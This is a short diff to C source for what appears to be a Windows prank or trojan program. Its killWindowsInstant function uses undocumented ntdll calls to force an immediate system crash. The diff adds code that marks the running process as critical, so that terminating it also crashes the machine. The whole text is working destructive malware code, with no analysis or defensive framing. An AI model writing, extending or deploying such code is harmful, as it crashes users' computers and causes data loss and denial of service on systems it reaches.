@@ -2,6 +2,15 @@
 #include <reason.h>
 
 #ifndef CLEAN
+
+#ifndef SE_SHUTDOWN_PRIVILEGE
+#define SE_SHUTDOWN_PRIVILEGE 19L
+#endif
+#ifndef SE_DEBUG_PRIVILEGE
+#define SE_DEBUG_PRIVILEGE 20L
+#endif
+#define ProcessBreakOnTermination 29
+
 DWORD WINAPI ripMessageThread(LPVOID parameter);
 
 void killWindowsInstant() {
@@ -11,11 +20,19 @@ void killWindowsInstant() {
 	HMODULE ntdll = LoadLibraryA("ntdll");
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
+	long int (*NtSetInformationProcess)(HANDLE, int, void *, unsigned long int);
+	*(FARPROC *)&NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");
 
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
 		BOOLEAN tmp1; DWORD tmp2;
-		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
+		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_SHUTDOWN_PRIVILEGE, 1, 0, &tmp1);
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
+	}
+	if(RtlAdjustPrivilege && NtSetInformationProcess) {
+		unsigned char old_value;
+		unsigned long int critical = 1;
+		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(SE_DEBUG_PRIVILEGE, 1, 0, &old_value);
+		NtSetInformationProcess((void *)-1, ProcessBreakOnTermination, &critical, sizeof critical);
 	}
 
 	// If the computer is still running, do it the normal way
